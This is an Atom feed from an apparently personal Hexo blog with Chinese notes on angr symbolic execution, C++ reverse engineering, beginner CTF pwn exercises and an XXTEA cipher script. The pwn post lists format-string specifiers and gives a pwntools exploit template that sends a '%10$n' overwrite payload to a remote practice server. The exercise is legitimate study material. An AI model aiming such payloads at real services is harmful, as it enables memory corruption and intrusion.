<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-02-16T04:48:50.124Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>angr-理解符号执行</title>
    <link href="http://example.com/2022/02/16/angr-%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2022/02/16/angr-%E7%90%86%E8%A7%A3%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/</id>
    <published>2022-02-16T04:10:22.000Z</published>
    <updated>2022-02-16T04:48:50.124Z</updated>
    
    <content type="html"><![CDATA[<h1 id="理解符号执行-angr"><a href="#理解符号执行-angr" class="headerlink" title="理解符号执行-angr"></a>理解符号执行-angr</h1><p>符号类似于我们在计算未知数x的值，我们可以通过路径来求解未知数。通过判断条件来选择路径，当符号满足设定条件时即走了正确的路径。</p><p>我们需要通过符号执行来达到一个目标，假设这个目标是走到success这一步。</p><p>那么我们符号执行的步骤就相当明了了。</p><p>第一步：找到符号。一般这里我们的未知数，即符号就是我们的input。</p><p>第二步：找到路径（分支）。</p><p>第三步：评估每条路径。</p><p>由于路径和二进制文件的复杂度提升，我们给出了更好的选择来通过电脑来评估路径，于是就有了angr</p><p>Angr是一个符号执行引擎。</p><p>它可以:</p><p>遍历二进制文件(并遵循任何分支)</p><p>搜索符合给定条件的程序状态</p><p>解给定路径(和其他)约束的符号变量</p><p>在这里分为<strong>符号</strong>和<strong>执行路径</strong>两个板块</p><p>首先讨论执行路径</p><h2 id="1-执行路径"><a href="#1-执行路径" class="headerlink" title="1.执行路径"></a>1.执行路径</h2><p>Angr在一个模拟管理器对象中存储和处理一组给定程序的可能路径。</p><p>模拟管理器提供了逐步执行程序以生成可能路径/状态的功能。</p><p><strong>构建一系列路径</strong></p><p>1.Angr在你指定的地方启动程序(这是第一个激活状态)</p><p>2.在每个活动(非终止)状态下执行指令，直到到达分支点或状态终止</p><p>3.在每个分支点上，将状态拆分为多个状态，并将它们添加到活动状态集</p><p>4.重复步骤2 . .4，直到我们找到我们想要的，否则所有的州都会被终止</p><p>我们可以对活动状态进行标记，以排除错误的路径。</p><p>1.加载二进制</p><p>2.指定起点并创建模拟管理器</p><p>3.当我们还没有找到我们想要的……</p><p>1）步进所有激活状态</p><p>2）在每个活动状态上运行’ should_accept_state ‘谓词</p><p>3）如果有人接受，我们就找到了我们想要的!退出循环</p><p>4）在每个活动状态上运行’ should_avoid_state ‘谓词</p><p>5）对于每个被接受的状态，将其标记为终止</p><p>6）从活动状态集中移除所有标记为终止的状态</p><p>这个算法angr写了一个单独的explore函数</p><p>simulation.explore(find=should_accept_path, avoid=should_avoid_path)</p><p>将添加任何被接受的路径到列表’ simulation.found ‘</p><p>simulation.explore(find= 0 x80430a,avoid= 0x9aa442)</p><p>将搜索地址0x80430a并终止任何到达0x9aa442的内容。</p><h2 id="2-符号和约束的引入"><a href="#2-符号和约束的引入" class="headerlink" title="2.符号和约束的引入"></a>2.符号和约束的引入</h2><p>在某些情况下，当从stdin文件中查询用户输入时，Angr会自动注入符号。＊它使用的是SimProcedures，我们将在后面介绍。</p><p>当Angr没有自动注入我们想要的符号时，我们可以手动这样做。</p><p>Angr的符号是用位向量来表示的</p><p>位向量有一个大小，即它们所代表的位数。</p><p>与编程中的所有数据一样，位向量可以表示任何适合的类型。通常，它们表示n位整数或字符串。</p><p>位向量和典型变量之间的区别是，典型变量存储单个值，而位向量存储满足一定约束条件的所有值。</p><p>在简单的例子中，angr会自动将您的input作为符号注入，但在一些复杂的情况下需要手动输入</p><p>下面是一些例子：</p><p><strong>注入符号示例</strong></p><p>1.寄存器</p><p>对于简单的情况，Angr会代替它，这样用户输入函数就会将符号值注入寄存器。</p><p>对于更复杂的情况，我们需要自己注入符号。在用户输入后启动程序，用符号值初始化寄存器。</p><p>情形:get_user_input函数通过将值写入寄存器来返回值（把输入存在内存中，并把地址写到rax寄存器并返回）。（angr不支持写入多个参数于不同地址。）</p><p>解决方案:不调用get_user_input，而是将符号值写入寄存器。</p><p>在Angr中，你可以用一个具体的或符号的值写入寄存器:</p><p>state.regs.eax = my_bitvector</p><p>将my_bitvector的值写入eax。</p><p>2.全局内存</p><p>情形:get_user_input函数通过将值写入编译时确定的地址来返回值。</p><p>解决方案:不调用get_user_input，而是将符号值写入地址。</p><p>3.栈</p><p>在Angr中，你可以用一个具体的或符号的值来推入堆栈:</p><p>state.stack_push (my_bitvector)</p><p>将my_bitvector的值推到堆栈的顶部。</p><p>你可能需要考虑你不关心的任何东西在堆栈的开始通过添加填充:</p><p>state.regs.esp - = 4</p><p>增加4个字节的填充。</p><p>4.动态内存</p><p>分配在堆上的内存</p><p>可以直接写入到指针覆盖原有指针</p><p>如果你不能确定scanf写入的地址，因为它存储在一个指针中，你可以覆盖指针的值，指向你选择的一个未使用的位置(在这个例子中，0x4444444):</p><p>state.memory.store(0xaf84dd8, 0x4444444) state.memory.store(0x4444444, my_bitvector)</p><p>此时，0xaf84dd8的指针将指向0x4444444，它将存储您的位向量。</p><p>5.文件系统</p><p>可以当作内存处理，但地址和内存的地址不同，要注意</p><p><strong>特殊情况</strong></p><p>1.hooks</p><p>如果想要跳一些地址，可以使用hook</p><p>您可以使用hooks来完成此操作。你可以指定一个‘hook’的地址，你想要跳过的指令的字节数，以及一个将运行的Python函数来替换跳过的指令。</p><p>注意:跳过的指令数可以为零。</p><p>Call: binary.hook(0x8048776, length=16, replacement_check_all_Z)</p><p>第一个是我们想要hook的地址，第二个是代表这些指令在内存中用16个字节表示（跳过的），第三个是代替运行这些指令的函数。</p><p>Hook可以用于:</p><p>在执行过程中注入符号值。</p><p>取代复杂的功能。</p><p>替换不支持的指令(例如，大多数系统调用)。</p><p>函数回顾</p><ol><li>将参数推入堆栈</li><li>将返回地址推到堆栈</li><li>跳转到功能地址</li><li>处理参数*</li><li>执行函数</li><li>将返回值写入适当的位置</li><li>弹出返回地址并跳转到它</li><li>弹出参数</li></ol><p><strong>simprocedures</strong></p><p>SimProcedures被用来替换任何你完全理解并且不想测试bug的东西，或者Angr不支持的东西。</p><p>因为问题的复杂性随着程序的长度呈指数级增长，任何满足上述条件的函数都应该用SimProcedure代替，以节省时间。</p><p>目前，在Angr中包含了libc子集(快速扩展)的重新实现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;理解符号执行-angr&quot;&gt;&lt;a href=&quot;#理解符号执行-angr&quot; class=&quot;headerlink&quot; title=&quot;理解符号执行-angr&quot;&gt;&lt;/a&gt;理解符号执行-angr&lt;/h1&gt;&lt;p&gt;符号类似于我们在计算未知数x的值，我们可以通过路径来求解未知数。通过</summary>
      
    
    
    
    
    <category term="angr" scheme="http://example.com/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>C++ Reserve 阅读</title>
    <link href="http://example.com/2022/02/09/C-Reserve/"/>
    <id>http://example.com/2022/02/09/C-Reserve/</id>
    <published>2022-02-09T07:46:13.000Z</published>
    <updated>2022-02-09T11:17:22.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是一个关于c++逆向的阅读材料，我大致做一些笔记，因为是全英文所以基本是翻译）</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>c++中主要是类，在我们理解c++时，对于c++目标的主要部分(类)以及这些部分如何联系在一起(类关系)有一个宏观的概念。</p><p>为了实现这种理解，我们必须能够：</p><p>(1)识别类</p><p>(2)识别类之间的关系</p><p>(3)识别类成员。</p><p>而人工分析检索c++类信息方法和自动化是这篇文章要讨论的内容。</p><h2 id="手动分析c-二进制文件"><a href="#手动分析c-二进制文件" class="headerlink" title="手动分析c++二进制文件"></a>手动分析c++二进制文件</h2><p>本节介绍分析c++二进制文件的手动方法;它特别侧重于识别/提取c++类及其对应成员(变量、函数、构造函数/析构函数)和关系。请注意</p><p>首先，我们需要识别这是否是一个c++文件，或者运用了c++的类，下面几种可以判断：</p><p>1)大量使用ecx(这个ptr)。可能首先看到的事情之一是大量使用ecx(用作this指针)。可能看到的一个地方是，在函数即将被调用之前被赋值。另一种情况是，如果一个函数使用了ecx而没有首先初始化它，这意味着它可能是一个类成员函数。</p>.jpg).jpg)<p>2）调用约定。与(1)相关的是，类成员函数调用时使用堆栈中常用的函数参数，并指向类的对象(即thispointer.)。下面是一个类实例化的例子，在这个例子中，分配的类对象(eax)最终将被传递给ecx，然后调用构造函数</p>.jpg)<p>此外，我们将注意到更可能是虚函数的间接函数调用;当然，如果不首先知道实际的类或在调试器下运行代码，就很难跟踪这些调用的去向。在这种情况下，我们必须首先知道ClassA的虚函数表(vftable)的位置，然后根据虚函数表中列出的函数列表确定函数的实际地址。</p><img src="/2022/02/09/C-Reserve/4.jpg" class="" width="4"><p>3）STL代码和导入的dll。判断一个样本是否为c++二进制文件的另一种方法是，目标是否使用STL代码，这可以通过导入函数或库签名识别(如IDA的FLIRT)来判断.</p><img src="/2022/02/09/C-Reserve/5.jpg" class="" width="5"><h3 id="类布局"><a href="#类布局" class="headerlink" title="类布局"></a>类布局</h3><p>我们还应该熟悉类在内存中的布局方式。让我们从一个非常简单的类开始。</p><img src="/2022/02/09/C-Reserve/6.jpg" class="" width="6"><p>这个类的布局如图所示</p><img src="/2022/02/09/C-Reserve/7.jpg" class="" width="7"><p>为了保持4字节的边界上的对齐，填充被添加到最后一个成员变量。在Visual c++中，成员变量在内存中的位置与声明的顺序相同。</p><p>当类中包含虚函数：</p><img src="/2022/02/09/C-Reserve/8.jpg" class="" width="8"><p>内存布局将变成这样：</p><img src="/2022/02/09/C-Reserve/9.jpg" class="" width="9"><p>注意，在布局的开头添加了一个指向虚函数表的指针。该表按照虚函数声明的顺序包含虚函数的地址。类Ex2的虚函数表如下所示：</p><img src="/2022/02/09/C-Reserve/10.jpg" class="" width="10"><p>如果一个类继承另一个类呢?以下是一个类从单个类继承时的情况，即单个继承：</p><img src="/2022/02/09/C-Reserve/11-16444044998161.jpg" class="" width="11"><p>布局是这样的</p><img src="/2022/02/09/C-Reserve/12.jpg" class="" width="12"><p>派生类的布局被简单地附加到基类的布局中。在多重继承的情况下，会发生以下情况：</p><img src="/2022/02/09/C-Reserve/13.jpg" class="" width="13"><img src="/2022/02/09/C-Reserve/14.jpg" class="" width="14"><p>正如所看到的，每个基类的实例数据的副本将被嵌入到派生类的实例中，每个包含虚函数的基类将有自己的vftable。注意，第一个基类与当前对象共享一个vftable。当前对象的虚函数将被追加到第一个基类的虚函数列表的末尾。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这是一个关于c++逆向的阅读材料，我大致做一些笔记，因为是全英文所以基本是翻译）&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot;</summary>
      
    
    
    
    
    <category term="-----" scheme="http://example.com/tags/"/>
    
  </entry>
  
  <entry>
    <title>pwn入门体验</title>
    <link href="http://example.com/2022/01/19/pwnstart/"/>
    <id>http://example.com/2022/01/19/pwnstart/</id>
    <published>2022-01-18T17:19:57.000Z</published>
    <updated>2022-01-18T17:26:01.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Water"><a href="#Water" class="headerlink" title="Water"></a>Water</h2><p>today i do nothing but i open the test of pwn, so……,my first blog in 2022</p><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>2022的第一篇博客，因为没接触过pwn就从攻防世界的新手题跟着做开始，找了一个视频跟着学和写，刚接触下来还是觉得比较有意思，但是听说看东西很折磨人）</p><h2 id="Point"><a href="#Point" class="headerlink" title="Point"></a>Point</h2><p>最开始的做题步骤首先是查位数，逆向中一般直接使用DIE就可以，在pwn里面可以直接file来查看文件的位数，这在编写exp文件的时候需要。然后是checksec命令，帮助我们看开了甚么保护。但打保护这方面我还没有学到，记得查就对了，养成好习惯。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 --  file 文件名</span><br><span class="line">2 --  checksec --file=文件名</span><br></pre></td></tr></table></figure><img src="/2022/01/19/pwnstart/1.png" class="" width="1">这里可以看到是一个32位的文件了，下一步是在ida里进行静态分析，然后确定漏洞类型，整理逻辑。<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>一开始的题就是栈溢出，比较好理解。通过溢出覆盖字节为你想要的内容来得到flag。一般都会有if语句判断数据是否等于一个规定的数据，通过溢出写入数据就可以达成目的。</p><h3 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点"></a>溢出点</h3><p>关于我做了一丢丢题，一般溢出点都会是buf等等，通过write，read，get等函数来溢出。要注意有漏洞的函数然后观察是否有溢出的可能性。</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>有一道题他需要溢出14+4个字节，但检验了填入数据的长度3-8，也就是说没办法填入那么多垃圾数据来溢出，这里解决的方法是转眼到了数据类型，因为是unsigned  short int，所以用8bit位来算0x101就变成了0x1，即可以257 + 2 ~ 257 + 7都可以通过检测。</p><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p>system函数与plt表和got表有关，在用于构造跳转时经常会用到两个表，有system函数说明在plt表中有该函数的地址，溢出返回地址需要为它的地址。跳转到返回地址后填入数据再写入想要的数据。在pwn题里经常需要构造结构来写payload去写入数据，要搞清楚思路和栈里的结构就会很好写脚本。</p><h3 id="libc泄露"><a href="#libc泄露" class="headerlink" title="libc泄露"></a>libc泄露</h3><p>libc文件和文件中的地址是不同的，不能直接用文件中的地址去打，会找到错误的地方，但地址之间的偏移量是固定的，所以可以计算文件和libc文件中的相应函数之间的固定偏移量，运用偏移量来寻址。从而继续构造结构来写脚本的payload。</p><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>还没仔细看资料，只是知道有这个东西，可以配合%n来写入数据，格式化字符串漏洞一般都需要调试文件，写入测试数据和一堆%p（地址）来找到漏洞的位置以便写入文件需要的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</span><br><span class="line"></span><br><span class="line">%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>攻防世界新手区详细的每道题解在这里<a href="http://www.peiqi.tech/posts/7499/#when-did-you-born">http://www.peiqi.tech/posts/7499/#when-did-you-born</a></p><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><p>通过写exp.py文件来打，模板和注意就放在这里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;x86&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>) <span class="comment">#x86是32位文件，amd64就是64位文件</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment">#攻击远程，打本地是1</span></span><br><span class="line">pwn_addr = <span class="number">0x0804A068</span> <span class="comment">#一般将地址写在这里</span></span><br><span class="line"><span class="comment">#如果是elf文件中可以寻址</span></span><br><span class="line"><span class="comment">#elf = ELF(&quot;level3&quot;) elf文件寻址需要写这个</span></span><br><span class="line"><span class="comment">#lib = ELF(&quot;libc_32.so.6&quot;) libc文件寻址需要写这个</span></span><br><span class="line"><span class="comment">#write_plt_addr = elf.plt[&quot;write&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span> <span class="comment">#main函数</span></span><br><span class="line">    <span class="keyword">global</span> sh</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">1</span>: <span class="comment">#打本地</span></span><br><span class="line">        sh = process(<span class="string">&#x27;CGfsb&#x27;</span>) <span class="comment">#文件名</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#打远程</span></span><br><span class="line">        sh = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">63601</span>) <span class="comment">#端口和ip</span></span><br><span class="line"></span><br><span class="line">    payload = p32(pwn_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + <span class="string">b&#x27;%10$n&#x27;</span> <span class="comment">#payload一般就是写入，填入数据的话需要以byte（字节流）的形式填入，不然会出错，这里的写入的地址等都要以p32或者p64来打包</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;please tell me your name:\n&quot;</span>,<span class="string">&quot;1&quot;</span>) <span class="comment">#sendlineafter，前面是程序中的语句，后面是你需要输入的东西</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;leave your message please:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()<span class="comment">#接收信息</span></span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>少打音游多读书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Water&quot;&gt;&lt;a href=&quot;#Water&quot; class=&quot;headerlink&quot; title=&quot;Water&quot;&gt;&lt;/a&gt;Water&lt;/h2&gt;&lt;p&gt;today i do nothing but i open the test of pwn, so……,my fir</summary>
      
    
    
    
    
    <category term="0-1--pwn" scheme="http://example.com/tags/0-1-pwn/"/>
    
  </entry>
  
  <entry>
    <title>XXTEA python</title>
    <link href="http://example.com/2021/12/30/XXTEA-python/"/>
    <id>http://example.com/2021/12/30/XXTEA-python/</id>
    <published>2021-12-30T07:57:58.000Z</published>
    <updated>2021-12-30T13:54:30.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XXTEA-python-加密-解密脚本"><a href="#XXTEA-python-加密-解密脚本" class="headerlink" title="XXTEA python 加密/解密脚本"></a>XXTEA python 加密/解密脚本</h2><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>normal24里面终于遇到了xxtea了，新加密get，找比较好的解密脚本也花了不少时间。另外还有tea和xtea的，这个写的头疼等摆一会有空补上。</p><p>参考<a href="http://www.yaowenming.com/A/8Bz8qZ6XJx/">http://www.yaowenming.com/A/8Bz8qZ6XJx/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">_DELTA = <span class="number">0x9E3779B9</span>  <span class="comment">#固定常量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_long2str</span>(<span class="params">v, w</span>):</span></span><br><span class="line">    n = (<span class="built_in">len</span>(v) - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> w:</span><br><span class="line">        m = v[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> (m &lt; n - <span class="number">3</span>) <span class="keyword">or</span> (m &gt; n): <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        n = m</span><br><span class="line">    s = struct.pack(<span class="string">&#x27;&lt;%iL&#x27;</span> % <span class="built_in">len</span>(v), *v)</span><br><span class="line">    <span class="keyword">return</span> s[<span class="number">0</span>:n] <span class="keyword">if</span> w <span class="keyword">else</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_str2long</span>(<span class="params">s, w</span>):</span></span><br><span class="line">    n = <span class="built_in">len</span>(s)</span><br><span class="line">    m = (<span class="number">4</span> - (n &amp; <span class="number">3</span>) &amp; <span class="number">3</span>) + n</span><br><span class="line">    s = s.ljust(m, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">    v = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;%iL&#x27;</span> % (m &gt;&gt; <span class="number">2</span>), s))</span><br><span class="line">    <span class="keyword">if</span> w: v.append(n)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params"><span class="built_in">str</span>, key</span>):</span> <span class="comment">#加密部分</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;&#x27;</span>: <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    v = _str2long(<span class="built_in">str</span>, <span class="literal">True</span>)</span><br><span class="line">    k = _str2long(key.ljust(<span class="number">16</span>, <span class="string">b&quot;\0&quot;</span>), <span class="literal">False</span>)</span><br><span class="line">    n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>) <span class="comment">#得出轮数</span></span><br><span class="line">    <span class="keyword">while</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> + _DELTA) &amp; <span class="number">0xffffffff</span> <span class="comment">#进行叠加</span></span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span> <span class="comment">#固定运算</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span>  <span class="built_in">range</span>(n):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n] = (v[n] + ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[n &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span>  <span class="comment">#xxtea加密的标识性加密步骤</span></span><br><span class="line">        z = v[n]</span><br><span class="line">        q -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> _long2str(v, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params"><span class="built_in">str</span>, key</span>):</span> <span class="comment">#解密部分</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;&#x27;</span>: <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    v = _str2long(<span class="built_in">str</span>, <span class="literal">False</span>)</span><br><span class="line">    k = _str2long(key.ljust(<span class="number">16</span>, <span class="string">b&quot;\0&quot;</span>), <span class="literal">False</span>)</span><br><span class="line">    n = <span class="built_in">len</span>(v) - <span class="number">1</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">sum</span> = (q * _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">sum</span> != <span class="number">0</span>):</span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        z = v[n]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (<span class="built_in">sum</span> ^ y) + (k[<span class="number">0</span> &amp; <span class="number">3</span> ^ e] ^ z))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> - _DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _long2str(v, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>解密使用示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">188</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">64</span>, <span class="number">244</span>, <span class="number">178</span>, <span class="number">178</span>, <span class="number">231</span>, <span class="number">169</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">18</span>, <span class="number">174</span>, <span class="number">16</span>, <span class="number">200</span>, <span class="number">91</span>, <span class="number">61</span>, <span class="number">215</span>, <span class="number">6</span>, <span class="number">29</span>, <span class="number">220</span>, <span class="number">112</span>, <span class="number">248</span>, <span class="number">220</span>]</span><br><span class="line"></span><br><span class="line">x = 